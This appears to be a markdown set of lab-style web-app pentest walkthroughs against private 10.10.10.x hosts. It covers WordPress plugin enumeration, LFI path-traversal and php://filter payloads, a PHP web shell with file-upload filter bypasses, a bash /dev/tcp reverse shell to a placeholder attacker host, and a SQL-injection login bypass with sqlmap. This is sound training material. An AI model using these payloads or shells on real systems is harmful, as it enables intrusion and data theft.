# 12 Web Apps — full walkthroughs

---

## Walkthrough 1: "Find the WordPress version and a vulnerable plugin on 10.10.10.30"

**Type:** CMS enum | **Difficulty:** easy | **Time:** 2–5 min

1. Confirm WordPress:
   ```bash
   whatweb http://10.10.10.30
   ```
   Output: `WordPress[5.7.2]`
2. Run wpscan:
   ```bash
   wpscan --url http://10.10.10.30 --enumerate vp,u
   ```
3. Read output — look for `[!] Title:` lines:
   ```
   [+] WordPress version 5.7.2 identified
   [+] wp-file-manager 6.8
    | [!] Title: WP File Manager — Unauthenticated RCE (CVE-2020-25213)
   ```
4. **Answer:** version = `5.7.2`, vuln plugin = `wp-file-manager 6.8 / CVE-2020-25213`

---

## Walkthrough 2: "Find an LFI vulnerability on 10.10.10.40"

1. Dir enum:
   ```bash
   gobuster dir -u http://10.10.10.40 -w /usr/share/wordlists/dirb/common.txt -x php
   ```
   Finds: `/index.php`
2. Browse, notice URL `http://10.10.10.40/index.php?page=home`. The `page=` param screams LFI.
3. Test:
   ```bash
   curl "http://10.10.10.40/index.php?page=../../../../etc/passwd"
   ```
4. If `/etc/passwd` contents appear → **vulnerable**.
5. If filtered, try PHP filter:
   ```bash
   curl "http://10.10.10.40/index.php?page=php://filter/convert.base64-encode/resource=index"
   ```
6. **Answer:** `page` parameter is LFI-vulnerable.

---

## Walkthrough 3: "Upload a shell and get RCE on the web app at 10.10.10.50"

1. Browse → find `/upload.php` (from gobuster).
2. Create shell:
   ```bash
   echo '<?php system($_GET["c"]); ?>' > shell.php
   ```
3. Upload via the form. If blocked, try `shell.phtml` or `shell.php.jpg`. Use Burp to swap `Content-Type: image/jpeg`.
4. Find upload path (often `/uploads/shell.php`):
   ```bash
   curl "http://10.10.10.50/uploads/shell.php?c=id"
   ```
   Output:
   ```
   uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```
5. Upgrade to reverse shell:
   ```bash
   curl "http://10.10.10.50/uploads/shell.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER>/4444+0>%261'"
   ```
6. **Answer:** RCE via arbitrary file upload at `/upload.php`.

---

## Walkthrough 4: "Find a SQL injection in the login form on 10.10.10.60"

1. Intercept login request in Burp → send to Repeater.
2. In the `username` field try:
   ```
   admin' OR '1'='1'-- -
   ```
   Password: anything.
3. If you log in as admin → classic auth bypass SQLi.
4. For full data extraction → save the request to `req.txt` and hand to sqlmap:
   ```bash
   sqlmap -r req.txt --batch --dbs
   ```
5. **Answer:** `username` parameter, vulnerable to boolean-based SQLi.

→ Full sqlmap flow: [13-sqli/walkthroughs.md](../13-sqli/walkthroughs.md)
